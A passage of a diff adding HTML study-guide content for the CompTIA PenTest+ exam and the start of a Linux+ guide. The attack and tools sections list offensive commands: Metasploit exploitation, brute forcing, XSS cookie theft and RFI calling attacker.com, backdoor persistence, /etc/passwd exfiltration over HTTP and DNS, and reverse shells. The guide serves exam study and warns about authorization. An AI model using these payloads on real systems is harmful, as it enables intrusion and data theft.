+<li>Allowed/prohibited techniques</li>
+<li>Emergency stop conditions</li>
+<li>Point of contact for issues</li>
+<li>Data handling requirements</li>
+<li>Third-party notification requirements (cloud providers, hosting)</li>
+</ul>
+<h3>Legal Documents</h3>
+<table>
+<thead>
+<tr>
+<th>Document</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>NDA (Non-Disclosure Agreement)</strong></td>
+<td>Protects confidential information shared during engagement</td>
+</tr>
+<tr>
+<td><strong>MSA (Master Service Agreement)</strong></td>
+<td>Long-term framework for ongoing work</td>
+</tr>
+<tr>
+<td><strong>SOW (Statement of Work)</strong></td>
+<td>Specific tasks, deliverables, timelines</td>
+</tr>
+<tr>
+<td><strong>Permission to Attack letter</strong></td>
+<td>Written authorization; get before testing</td>
+</tr>
+<tr>
+<td><strong>RoE document</strong></td>
+<td>Testing boundaries and rules</td>
+</tr>
+</tbody>
+</table>
+<div class="lesson-callout">
+<p>⚠️ <strong>CRITICAL:</strong> Never begin testing without written authorization. Unauthorized testing = illegal under CFAA, Computer Misuse Act, and similar laws.</p>
+</div>
+<h3>Legal Considerations</h3>
+<ul>
+<li><strong>CFAA (Computer Fraud and Abuse Act):</strong> US federal law criminalizing unauthorized computer access</li>
+<li><strong>ECPA:</strong> Electronic Communications Privacy Act — intercepting communications</li>
+<li><strong>GDPR:</strong> Data protection (EU) — relevant if personal data is accessed</li>
+<li><strong>PCI DSS:</strong> Specific requirements for payment card testing</li>
+<li><strong>HIPAA:</strong> Protected health information considerations</li>
+</ul>
+<p><strong>Safe harbor:</strong> Contract language protecting the tester from liability for damage caused by authorized testing activities.</p>
+<h3>Pentest Methodologies</h3>
+<p><strong>PTES (Penetration Testing Execution Standard):</strong></p>
+<ol>
+<li>Pre-engagement interactions</li>
+<li>Intelligence gathering</li>
+<li>Threat modeling</li>
+<li>Vulnerability analysis</li>
+<li>Exploitation</li>
+<li>Post-exploitation</li>
+<li>Reporting</li>
+</ol>
+<p><strong>OWASP Testing Guide:</strong> Web application security testing methodology</p>
+<p><strong>NIST SP 800-115:</strong> Technical Guide to Information Security Testing</p>
+<p><strong>OSSTMM (Open Source Security Testing Methodology Manual):</strong> Comprehensive methodology covering multiple attack surfaces</p>
+<p><strong>Cyber Kill Chain (Lockheed Martin):</strong></p>
+<ol>
+<li>Reconnaissance</li>
+<li>Weaponization</li>
+<li>Delivery</li>
+<li>Exploitation</li>
+<li>Installation</li>
+<li>Command &amp; Control (C2)</li>
+<li>Actions on Objectives</li>
+</ol>
+<p><strong>MITRE ATT&amp;CK Framework:</strong> Knowledge base of adversary tactics, techniques, and procedures (TTPs)</p>
+
+`,
+  "study-guide-pentestplus-03": `
+<h2>3. Domain 2: Reconnaissance and Enumeration</h2>
+<h3>Passive Reconnaissance</h3>
+<p>Gathering information <strong>without directly interacting</strong> with the target.</p>
+<p><strong>OSINT (Open Source Intelligence) sources:</strong></p>
+<ul>
+<li><strong>WHOIS:</strong> Domain registration info (registrar, owner, dates, name servers)</li>
+<li><strong>DNS records:</strong> A, MX, NS, TXT, CNAME — reveal infrastructure</li>
+<li><strong>Google Dorking:</strong> Advanced search operators to find sensitive info<ul>
+<li><code>site:example.com filetype:pdf</code></li>
+<li><code>site:example.com inurl:admin</code></li>
+<li><code>intitle:"index of" site:example.com</code></li>
+<li><code>"password" filetype:txt site:example.com</code></li>
+</ul>
+</li>
+<li><strong>Shodan:</strong> Search engine for internet-connected devices; find exposed services</li>
+<li><strong>Censys:</strong> Similar to Shodan; more detailed TLS/cert info</li>
+<li><strong>ZoomEye:</strong> Chinese equivalent of Shodan</li>
+<li><strong>LinkedIn:</strong> Employee names, roles, technologies</li>
+<li><strong>GitHub/GitLab:</strong> Leaked credentials, API keys in repositories</li>
+<li><strong>Pastebin:</strong> Leaked data dumps</li>
+<li><strong>Wayback Machine (archive.org):</strong> Historical snapshots of websites</li>
+<li><strong>Hunter.io:</strong> Email format discovery</li>
+<li><strong>theHarvester:</strong> Automate email, subdomain, IP, URL gathering from public sources</li>
+<li><strong>Maltego:</strong> Relationship mapping and OSINT visualization</li>
+<li><strong>Recon-ng:</strong> Modular OSINT framework</li>
+</ul>
+<p><strong>Certificate Transparency Logs:</strong></p>
+<ul>
+<li><code>crt.sh</code> — find all SSL certs issued for a domain → reveals subdomains</li>
+</ul>
+<p><strong>Job postings:</strong> Reveal tech stack, vulnerabilities, and organizational info</p>
+<h3>Active Reconnaissance</h3>
+<p>Directly probing the target system.</p>
+<p><strong>DNS Enumeration:</strong></p>
+<pre><code>nslookup example.com
+dig example.com any
+dig example.com MX
+dig example.com NS
+host -t mx example.com
+fierce --domain example.com          # DNS brute force
+dnsrecon -d example.com -t std       # Multiple record types
+dnsenum example.com                  # Comprehensive DNS enum
+</code></pre>
+<p><strong>DNS Zone Transfer (AXFR):</strong></p>
+<pre><code>dig axfr @ns1.example.com example.com   # Attempt zone transfer (misconfiguration)
+</code></pre>
+<p><strong>Subdomain Enumeration:</strong></p>
+<pre><code>gobuster dns -d example.com -w wordlist.txt
+subfinder -d example.com
+amass enum -d example.com
+</code></pre>
+<p><strong>Network Scanning with Nmap:</strong></p>
+<pre><code># Host discovery (ping sweep)
+nmap -sn 192.168.1.0/24
+
+# Stealth SYN scan
+nmap -sS 192.168.1.0/24
+
+# Full TCP connect scan
+nmap -sT 10.0.0.1
+
+# UDP scan
+nmap -sU 10.0.0.1
+
+# Version detection
+nmap -sV 10.0.0.1
+
+# OS detection
+nmap -O 10.0.0.1
+
+# Aggressive scan (OS + version + scripts + traceroute)
+nmap -A 10.0.0.1
+
+# Specific port range
+nmap -p 1-1024 10.0.0.1
+nmap -p 22,80,443,3389 10.0.0.1
+nmap -p- 10.0.0.1          # All 65535 ports
+
+# Script scanning
+nmap --script=vuln 10.0.0.1
+nmap --script=http-enum 10.0.0.1
+nmap --script=smb-vuln* 10.0.0.1
+
+# Timing (-T0 slowest/stealthy, -T5 fastest/loud)
+nmap -T2 -sS 10.0.0.1
+
+# Output formats
+nmap -oA scan_results 10.0.0.1    # All formats (normal, XML, grepable)
+nmap -oX scan.xml 10.0.0.1
+</code></pre>
+<p><strong>Nmap Scan Types:</strong></p>
+<ul>
+<li><code>-sS</code> SYN/Stealth (default, most common)</li>
+<li><code>-sT</code> TCP Connect (full connection, noisy)</li>
+<li><code>-sU</code> UDP (slow, important for DNS/SNMP/DHCP)</li>
+<li><code>-sA</code> ACK (firewall mapping)</li>
+<li><code>-sF</code>, <code>-sX</code>, <code>-sN</code> FIN, Xmas, Null (firewall evasion)</li>
+<li><code>-sP</code>/<code>-sn</code> Ping only (host discovery)</li>
+</ul>
+<p><strong>Service/Banner Grabbing:</strong></p>
+<pre><code>nc -nv 10.0.0.1 80          # Netcat banner grab
+telnet 10.0.0.1 25          # SMTP banner
+curl -I http://10.0.0.1     # HTTP headers
+</code></pre>
+<h3>Enumeration by Protocol</h3>
+<p><strong>SMB/Windows:</strong></p>
+<pre><code>enum4linux -a 10.0.0.1        # Enumerate SMB (users, shares, groups)
+smbclient -L //10.0.0.1       # List shares
+crackmapexec smb 10.0.0.1     # SMB enum + password testing
+nmap --script smb-enum-shares,smb-enum-users 10.0.0.1
+</code></pre>
+<p><strong>SNMP:</strong></p>
+<pre><code>snmpwalk -v2c -c public 10.0.0.1   # Walk OID tree
+onesixtyone -c community.txt 10.0.0.1  # Brute force community strings
+snmp-check 10.0.0.1
+</code></pre>
+<p><strong>LDAP:</strong></p>
+<pre><code>ldapsearch -x -h 10.0.0.1 -b "dc=example,dc=com"
+nmap -p 389 --script ldap-rootdse 10.0.0.1
+</code></pre>
+<p><strong>Web Application:</strong></p>
+<pre><code>gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt
+dirb http://10.0.0.1
+nikto -h http://10.0.0.1        # Web vulnerability scanner
+</code></pre>
+
+`,
+  "study-guide-pentestplus-04": `
+<h2>4. Domain 3: Vulnerability Discovery and Analysis</h2>
+<h3>Vulnerability Scanning</h3>
+<p><strong>Automated scanners:</strong></p>
+<ul>
+<li><strong>Nessus:</strong> Most popular; comprehensive (free Essentials or paid)</li>
+<li><strong>OpenVAS (GVM):</strong> Open-source alternative</li>
+<li><strong>Qualys:</strong> Cloud-based enterprise scanner</li>
+<li><strong>Nexpose/InsightVM:</strong> Rapid7 product</li>
+<li><strong>Burp Suite:</strong> Web application vulnerability scanner (also manual testing)</li>
+</ul>
+<p><strong>Scanning approaches:</strong></p>
+<ul>
+<li><strong>Credentialed scan:</strong> Provides login credentials → deeper, more accurate</li>
+<li><strong>Non-credentialed:</strong> External attacker view → misses internal issues</li>
+<li><strong>Agent-based:</strong> Software on endpoint → always up-to-date</li>
+</ul>
+<h3>Vulnerability Analysis</h3>
+<p><strong>CVE (Common Vulnerabilities and Exposures):</strong> Unique ID for known vulnerabilities (e.g., CVE-2021-44228)</p>
+<p><strong>CVSS v3 scoring (0–10):</strong></p>
+<ul>
+<li><strong>Critical:</strong> 9.0–10.0</li>
+<li><strong>High:</strong> 7.0–8.9</li>
+<li><strong>Medium:</strong> 4.0–6.9</li>
+<li><strong>Low:</strong> 0.1–3.9</li>
+</ul>
+<p><strong>CVSS v3 metrics:</strong></p>
+<ul>
+<li>Attack Vector (Network/Adjacent/Local/Physical)</li>
+<li>Attack Complexity (Low/High)</li>
+<li>Privileges Required</li>
+<li>User Interaction</li>
+<li>Scope</li>
+<li>Confidentiality/Integrity/Availability Impact</li>
+</ul>
+<p><strong>CPE (Common Platform Enumeration):</strong> Standard naming for software/hardware<br/><strong>CWE (Common Weakness Enumeration):</strong> Category of weakness type (e.g., CWE-79 = XSS)</p>
+<h3>Common Vulnerabilities</h3>
+<p><strong>Unpatched systems:</strong> Missing OS/app patches with known CVEs<br/><strong>Default credentials:</strong> Admin:admin, admin:password on routers, cameras<br/><strong>Open services:</strong> Unnecessary exposed ports (Telnet, FTP, RDP to internet)<br/><strong>Weak encryption:</strong> SSL/TLS 1.0, RC4, DES, MD5<br/><strong>Misconfigurations:</strong> Open S3 buckets, overly permissive ACLs<br/><strong>Insecure protocols:</strong> Telnet (23), FTP (21), HTTP (80) for sensitive data</p>
+
+`,
+  "study-guide-pentestplus-05": `
+<h2>5. Domain 4: Attacks and Exploits</h2>
+<h3>Exploitation Framework: Metasploit</h3>
+<pre><code># Start Metasploit
+msfconsole
+
+# Search for exploits
+search ms17-010              # EternalBlue
+search type:exploit name:smb
+
+# Use an exploit
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 10.0.0.5
+set LHOST 10.0.0.1
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run / exploit
+
+# Meterpreter (post-exploitation)
+sysinfo                      # System info
+getuid                       # Current user
+getsystem                    # Attempt privilege escalation
+ps                           # List processes
+migrate 1234                 # Migrate to another process
+shell                        # Drop to OS shell
+upload /path/file.exe C:\\\\temp\\\\file.exe
+download C:\\\\file.txt /local/path
+hashdump                     # Dump password hashes
+run post/windows/gather/enum_logged_on_users
+run post/multi/recon/local_exploit_suggester
+background                   # Background the session
+sessions -l                  # List sessions
+sessions -i 1                # Resume session 1
+</code></pre>
+<h3>Password Attacks</h3>
+<p><strong>Online attacks (against live services):</strong></p>
+<pre><code>hydra -l admin -P wordlist.txt ssh://10.0.0.1        # SSH brute force
+hydra -L users.txt -P pass.txt http-post-form 10.0.0.1 "/login:user=^USER^&amp;pass=^PASS^:Invalid"
+crackmapexec smb 10.0.0.1 -u users.txt -p passwords.txt
+medusa -h 10.0.0.1 -u admin -P pass.txt -M ssh
+</code></pre>
+<p><strong>Offline attacks (against captured hashes):</strong></p>
+<pre><code># Hashcat
+hashcat -m 1000 hashes.txt wordlist.txt                   # NTLM
+hashcat -m 1800 hashes.txt wordlist.txt                   # SHA-512
+hashcat -m 0    hashes.txt wordlist.txt                   # MD5
+hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule  # With rules
+hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d            # Mask attack
+
+# John the Ripper
+john hashes.txt --wordlist=rockyou.txt
+john --format=nt hashes.txt
+john --rules hashes.txt
+john --show hashes.txt      # Show cracked passwords
+unshadow /etc/passwd /etc/shadow &gt; combined.txt  # Linux
+john combined.txt
+
+# Common hash modes in Hashcat
+# 0    = MD5
+# 100  = SHA-1
+# 1400 = SHA-256
+# 1000 = NTLM (Windows)
+# 1800 = sha512crypt (Linux)
+# 3200 = bcrypt
+# 2500 = WPA/WPA2
+</code></pre>
+<p><strong>Hash capture:</strong></p>
+<pre><code>responder -I eth0 -rdwv         # Capture NetNTLM hashes on network
+impacket-ntlmrelayx -tf targets.txt  # NTLM relay
+</code></pre>
+<h3>Network Attacks</h3>
+<p><strong>ARP Poisoning / Man-in-the-Middle:</strong></p>
+<pre><code>arpspoof -i eth0 -t 192.168.1.100 192.168.1.1    # Tell victim we are gateway
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.100    # Tell gateway we are victim
+# Enable IP forwarding
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+# Then sniff traffic
+ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//
+bettercap                          # Modern framework for MITM
+</code></pre>
+<p><strong>SSL Stripping:</strong></p>
+<pre><code>sslstrip -l 8080
+# Combined with ARP poisoning redirects HTTPS to HTTP
+</code></pre>
+<p><strong>DNS Spoofing:</strong></p>
+<pre><code># Edit /etc/ettercap/etter.dns with fake records
+ettercap -T -M arp:remote -P dns_spoof ...
+</code></pre>
+<p><strong>Packet Capture:</strong></p>
+<pre><code>tcpdump -i eth0 -w capture.pcap
+tcpdump -r capture.pcap 'tcp port 80'
+wireshark capture.pcap
+</code></pre>
+<h3>Web Application Attacks</h3>
+<p><strong>SQL Injection:</strong></p>
+<pre><code># Manual testing
+' OR '1'='1
+' OR '1'='1' --
+' UNION SELECT null,null,null--
+' UNION SELECT username,password FROM users--
+'; DROP TABLE users--
+
+# Automated with sqlmap
+sqlmap -u "http://example.com/page?id=1" --dbs
+sqlmap -u "http://example.com/page?id=1" -D database --tables
+sqlmap -u "http://example.com/page?id=1" -D database -T users --dump
+sqlmap -u "http://example.com/login" --data="user=admin&amp;pass=test" --dbs
+sqlmap -u "http://example.com/" --cookie="session=abc" --dbs
+sqlmap --os-shell        # OS shell via SQLi
+</code></pre>
+<p><strong>Cross-Site Scripting (XSS):</strong></p>
+<pre><code>&lt;!-- Reflected XSS --&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+
+&lt;!-- Stealing cookies --&gt;
+&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+
+&lt;!-- DOM-based XSS sources --&gt;
+document.URL, document.cookie, location.hash
+</code></pre>
+<p><strong>CSRF (Cross-Site Request Forgery):</strong></p>
+<pre><code>&lt;!-- Forge request using victim's session --&gt;
+&lt;img src="http://bank.com/transfer?amount=1000&amp;to=attacker"&gt;
+&lt;form method="POST" action="http://bank.com/transfer"&gt;
+  &lt;input name="amount" value="1000"&gt;
+  &lt;input name="to" value="attacker"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+</code></pre>
+<p><strong>Directory Traversal / Path Traversal:</strong></p>
+<pre><code>../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+</code></pre><p><strong>File Inclusion:</strong></p>
+<pre><code>http://example.com/page?file=../../../etc/passwd    # LFI
+http://example.com/page?file=http://attacker.com/shell.php  # RFI
+</code></pre><p><strong>Command Injection:</strong></p>
+<pre><code>; cat /etc/passwd
+| cat /etc/passwd
+&amp;&amp; id
+$(id)
+\`id\`
+</code></pre><p><strong>SSRF (Server-Side Request Forgery):</strong></p>
+<pre><code>http://169.254.169.254/latest/meta-data/          # AWS metadata
+http://localhost/admin
+http://internal-service/api/
+</code></pre><p><strong>Burp Suite workflow:</strong></p>
+<ol>
+<li>Intercept traffic with proxy (port 8080)</li>
+<li>Send requests to Repeater for manual testing</li>
+<li>Send to Intruder for fuzzing/brute force</li>
+<li>Use Scanner for automated finding</li>
+<li>Use Decoder for encode/decode</li>
+<li>Use Comparer to diff responses</li>
+</ol>
+<h3>Post-Exploitation</h3>
+<p><strong>Privilege Escalation — Linux:</strong></p>
+<pre><code># Enumeration scripts
+./linpeas.sh
+./linux-exploit-suggester.sh
+
+# SUID binaries (run as root)
+find / -perm -u=s -type f 2&gt;/dev/null
+# Check GTFOBins for how to abuse SUID binaries
+
+# Writable files and directories
+find / -writable -type f 2&gt;/dev/null
+
+# Cron jobs
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+# Sudo permissions
+sudo -l
+
+# Kernel exploits
+uname -a
+# Search CVEs for that kernel version
+
+# Weak passwords in files
+find / -name "*.conf" 2&gt;/dev/null | xargs grep -l "password"
+cat ~/.bash_history
+</code></pre>
+<p><strong>Privilege Escalation — Windows:</strong></p>
+<pre><code># Enumeration scripts
+.\\winPEAS.exe
+PowerUp.ps1
+
+# Unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"
+
+# Always Install Elevated
+reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+
+# Scheduled tasks
+schtasks /query /fo LIST /v
+
+# Misconfigured services
+accesschk.exe -ucqv &lt;service&gt; -accepteula
+sc qc &lt;service&gt;
+
+# DLL hijacking
+# Find service with missing DLL, place malicious DLL in search path
+</code></pre>
+<p><strong>Lateral Movement:</strong></p>
+<pre><code># Pass-the-Hash (PTH)
+impacket-psexec -hashes :NTLMHASH administrator@10.0.0.5
+crackmapexec smb 10.0.0.0/24 -u admin -H NTLMHASH
+
+# Pass-the-Ticket (Kerberos)
+mimikatz # sekurlsa::tickets /export
+Rubeus.exe ptt /ticket:ticket.kirbi
+
+# Remote execution
+impacket-psexec administrator:password@10.0.0.5
+impacket-wmiexec administrator:password@10.0.0.5
+impacket-smbexec administrator:password@10.0.0.5
+
+# PsExec (legitimate tool, commonly abused)
+PsExec.exe \\\\10.0.0.5 -u admin -p password cmd
+</code></pre>
+<p><strong>Persistence:</strong></p>
+<pre><code># Linux
+echo "*/5 * * * * /tmp/backdoor.sh" &gt;&gt; /etc/crontab    # Cron job
+echo "alice ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers    # Sudo
+useradd -m -s /bin/bash -G sudo backdoor               # New admin user
+# ~/.bashrc or ~/.profile modification
+
+# Windows
+reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe
+schtasks /create /sc minute /mo 5 /tn "Updater" /tr C:\\backdoor.exe
+net user backdoor Password123! /add
+net localgroup administrators backdoor /add
+</code></pre>
+<p><strong>Data Exfiltration:</strong></p>
+<pre><code># File transfer
+python3 -m http.server 8080         # Serve files on attacker
+wget http://attacker.com/file       # Download on victim
+curl -X POST -F file=@/etc/passwd http://attacker.com/upload
+
+# Encode/exfil via DNS
+cat /etc/passwd | xxd | cut -c10-49 | tr -d ' \\n' | fold -w63 | \\
+  while read l; do dig \${l}.attacker.com; done
+
+# Covert channel with ICMP
+# ping with data payload
+</code></pre>
+<h3>Evasion Techniques</h3>
+<ul>
+<li><strong>Encode payloads:</strong> Base64, hex, XOR</li>
+<li><strong>Obfuscation:</strong> Rename tools, change signatures</li>
+<li><strong>Fragmentation:</strong> Break packets to evade IDS</li>
+<li><strong>Slow scan:</strong> Reduce scan rate to avoid detection</li>
+<li><strong>Decoy scan:</strong> <code>nmap -D RND:10 target</code> — fake source IPs</li>
+<li><strong>Living off the Land:</strong> Use built-in tools (PowerShell, WMI, certutil)</li>
+<li><strong>Packed malware:</strong> Compress/encrypt payload</li>
+<li><strong>Process injection:</strong> Inject shellcode into legitimate process</li>
+<li><strong>Timestomping:</strong> Change file timestamps to blend in</li>
+</ul>
+
+`,
+  "study-guide-pentestplus-06": `
+<h2>6. Domain 5: Reporting and Communication</h2>
+<h3>Report Structure</h3>
+<ol>
+<li><p><strong>Executive Summary</strong></p>
+<ul>
+<li>High-level findings for non-technical leadership</li>
+<li>Business risk, not technical details</li>
+<li>Critical findings overview</li>
+<li>Recommendations summary</li>
+</ul>
+</li>
+<li><p><strong>Technical Findings</strong></p>
+<ul>
+<li>Each vulnerability documented with:<ul>
+<li>Vulnerability title and CVE/CWE</li>
+<li>Severity (Critical/High/Medium/Low/Informational)</li>
+<li>Affected system(s)</li>
+<li>Description (what it is)</li>
+<li>Evidence (screenshots, output, PoC)</li>
+<li>Impact (what an attacker could do)</li>
+<li>Remediation (how to fix it)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>Methodology</strong></p>
+<ul>
+<li>Scope of engagement</li>
+<li>Testing approach</li>
+<li>Tools used</li>
+<li>Timeline</li>
+</ul>
+</li>
+<li><p><strong>Appendices</strong></p>
+<ul>
+<li>Full tool output</li>
+<li>Raw scan data</li>
+<li>Credentials obtained (if any)</li>
+<li>Evidence screenshots</li>
+</ul>
+</li>
+</ol>
+<h3>Severity Rating</h3>
+<table>
+<thead>
+<tr>
+<th>Rating</th>
+<th>CVSS Score</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Critical</td>
+<td>9.0–10.0</td>
+<td>Immediate exploitation risk, full compromise</td>
+</tr>
+<tr>
+<td>High</td>
+<td>7.0–8.9</td>
+<td>Significant risk, difficult to exploit</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>4.0–6.9</td>
+<td>Moderate risk, some limitations</td>
+</tr>
+<tr>
+<td>Low</td>
+<td>0.1–3.9</td>
+<td>Minimal risk, limited impact</td>
+</tr>
+<tr>
+<td>Informational</td>
+<td>0</td>
+<td>No immediate risk, best practice</td>
+</tr>
+</tbody>
+</table>
+<h3>Communication During Testing</h3>
+<p><strong>Immediate notification triggers:</strong></p>
+<ul>
+<li>Discovered evidence of active compromise (another attacker)</li>
+<li>Accidental damage to systems</li>
+<li>Discovery of criminal activity (CSAM, fraud)</li>
+<li>Reaching out-of-scope systems</li>
+<li>Critical vulnerability that needs immediate remediation</li>
+</ul>
+<p><strong>Written communication:</strong> Document all actions taken with timestamps<br/><strong>Chain of custody:</strong> Maintain evidence integrity for potential legal action</p>
+
+`,
+  "study-guide-pentestplus-07": `
+<h2>7. Domain 6: Tools and Code Analysis</h2>
+<h3>Tool Categories</h3>
+<p><strong>Reconnaissance:</strong></p>
+<ul>
+<li>theHarvester, Maltego, Recon-ng, Shodan, SpiderFoot</li>
+</ul>
+<p><strong>Scanning:</strong></p>
+<ul>
+<li>Nmap, Masscan (fastest), Nessus, OpenVAS, Nikto</li>
+</ul>
+<p><strong>Web Application:</strong></p>
+<ul>
+<li>Burp Suite, OWASP ZAP, sqlmap, Dirb, Gobuster, WFuzz</li>
+</ul>
+<p><strong>Password:</strong></p>
+<ul>
+<li>Hashcat, John the Ripper, Hydra, Medusa, CrackMapExec</li>
+</ul>
+<p><strong>Exploitation:</strong></p>
+<ul>
+<li>Metasploit, ExploitDB (searchsploit), BeEF (browser exploitation)</li>
+</ul>
+<p><strong>Post-exploitation:</strong></p>
+<ul>
+<li>Mimikatz (credentials), BloodHound (AD analysis), Empire, Covenant (C2)</li>
+</ul>
+<p><strong>Wireless:</strong></p>
+<ul>
+<li>Aircrack-ng suite, Kismet, Wireshark, Wifite</li>
+</ul>
+<p><strong>Network MITM:</strong></p>
+<ul>
+<li>Bettercap, Ettercap, Responder</li>
+</ul>
+<p><strong>Forensics/Analysis:</strong></p>
+<ul>
+<li>Wireshark, tcpdump, Volatility</li>
+</ul>
+<h3>Code Analysis Basics</h3>
+<p><strong>Reading Python exploits:</strong></p>
+<pre><code>import socket
+import struct
+
+# Buffer overflow
+buffer = "A" * 2003                    # Offset to EIP
+buffer += "\\x8f\\x35\\x4a\\x5f"         # JMP ESP address (little-endian)
+buffer += "\\x90" * 16                  # NOP sled
+buffer += shellcode                    # Shellcode goes here
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.0.0.5', 9999))
+s.send(buffer.encode())
+s.close()
+</code></pre>
+<p><strong>Reading Bash scripts:</strong></p>
+<pre><code>#!/bin/bash
+# Reverse shell
+/bin/bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1
+
+# One-liner alternatives
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
+nc -e /bin/bash 10.0.0.1 4444
+</code></pre>
+<p><strong>Netcat listeners:</strong></p>
+<pre><code># Catch reverse shell
+nc -nlvp 4444
+
+# Upgrade to fully interactive shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+</code></pre>
+
+`,
+  "study-guide-pentestplus-08": `
+<h2>8. PenTest+ Key Concepts Summary</h2>
+<table>
+<thead>
+<tr>
+<th>Concept</th>
+<th>Key Points</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Authorization</strong></td>
+<td>Must have written permission before any testing</td>
+</tr>
+<tr>
+<td><strong>Scope</strong></td>
+<td>Know what's in/out; stay in bounds</td>
+</tr>
+<tr>
+<td><strong>PTES</strong></td>
+<td>Pre-engagement → Intel → Threat model → Vuln → Exploit → Post-exploit → Report</td>
+</tr>
+<tr>
+<td><strong>Kill Chain</strong></td>
+<td>Recon → Weapon → Deliver → Exploit → Install → C2 → Actions</td>
+</tr>
+<tr>
+<td><strong>CVSS</strong></td>
+<td>0–10 severity; Critical 9+, High 7+, Medium 4+, Low 0.1+</td>
+</tr>
+<tr>
+<td><strong>Nmap -sS</strong></td>
+<td>Stealth SYN scan (default, requires root)</td>
+</tr>
+<tr>
+<td><strong>Metasploit</strong></td>
+<td>Framework: search → use → set options → run</td>
+</tr>
+<tr>
+<td><strong>sqlmap</strong></td>
+<td>Automated SQL injection testing</td>
+</tr>
+<tr>
+<td><strong>Mimikatz</strong></td>
+<td>Credential dumping from Windows memory</td>
+</tr>
+<tr>
+<td><strong>BloodHound</strong></td>
+<td>AD attack path visualization</td>
+</tr>
+<tr>
+<td><strong>Hashcat</strong></td>
+<td>Offline password cracking (-m mode)</td>
+</tr>
+<tr>
+<td><strong>Hydra</strong></td>
+<td>Online brute force (SSH, HTTP, FTP, etc.)</td>
+</tr>
+<tr>
+<td><strong>Burp Suite</strong></td>
+<td>Web app proxy/scanner/testing tool</td>
+</tr>
+<tr>
+<td><strong>Responder</strong></td>
+<td>Capture NetNTLM hashes on local network</td>
+</tr>
+<tr>
+<td><strong>Report</strong></td>
+<td>Executive summary + technical findings + evidence + remediation</td>
+</tr>
+</tbody>
+</table>
+
+<p><em>End of CompTIA PenTest+ Study Guide</em></p>
+
+`,
+  "study-guide-linuxplus-01": `
+<h2>1. Exam Overview</h2>
+<p><strong>Exam Code:</strong> XK0-005<br/><strong>Questions:</strong> Maximum 90 (multiple-choice + performance-based)<br/><strong>Time Limit:</strong> 90 minutes<br/><strong>Passing Score:</strong> 720 (on a 100–900 scale)<br/><strong>Recommended Experience:</strong> CompTIA A+, Network+, and 12 months Linux admin experience</p>
+<h3>Domain Breakdown</h3>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>Weight</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1. System Management</td>
+<td>32%</td>
+</tr>
+<tr>
+<td>2. Security</td>
+<td>21%</td>
+</tr>
+<tr>
+<td>3. Scripting, Containers, and Automation</td>
+<td>19%</td>
+</tr>
+<tr>
+<td>4. Troubleshooting</td>
+<td>28%</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-linuxplus-02": `
+<h2>2. Linux Fundamentals</h2>
+<h3>Linux Distributions</h3>
+<p><strong>Red Hat Family (RPM-based):</strong></p>
+<ul>
+<li>RHEL (Red Hat Enterprise Linux) — enterprise, paid</li>
+<li>CentOS Stream — community RHEL upstream</li>
+<li>AlmaLinux, Rocky Linux — RHEL clones (free)</li>
+<li>Fedora — cutting-edge, Red Hat community</li>
+<li>openSUSE, SLES (SUSE Linux Enterprise)</li>
+</ul>
+<p><strong>Debian Family (DEB-based):</strong></p>
+<ul>
+<li>Debian — stable, community</li>
+<li>Ubuntu — most popular desktop/server</li>
+<li>Linux Mint — beginner-friendly desktop</li>
+<li>Kali Linux — security testing</li>
+</ul>
+<p><strong>Other:</strong></p>
+<ul>
+<li>Arch Linux — rolling release, DIY</li>
+<li>Gentoo — compile from source</li>
+<li>Alpine Linux — minimal, containers</li>
+</ul>
+<h3>Linux File System Hierarchy (FHS)</h3>
+<pre><code>/                   Root directory — top of the tree
+├── bin/            Essential user binaries (ls, cp, mv)
+├── sbin/           System binaries for root (fdisk, iptables)
+├── boot/           Boot loader files (vmlinuz, grub)
+├── dev/            Device files (sda, tty, null, random)
+├── etc/            Configuration files
+│   ├── passwd      User account info
+│   ├── shadow      Encrypted passwords
+│   ├── group       Group info
+│   ├── fstab       Filesystem mount table
+│   ├── hosts       Static hostname resolution
+│   ├── hostname    System hostname
+│   ├── resolv.conf DNS configuration
+│   ├── cron.d/     Cron job files
+│   ├── ssh/        SSH configuration
+│   └── sudoers     Sudo permissions
+├── home/           User home directories (/home/alice)
+├── lib/            Shared libraries
+├── lib64/          64-bit shared libraries
+├── media/          Mount point for removable media
+├── mnt/            Temporary mount points
+├── opt/            Optional/third-party software
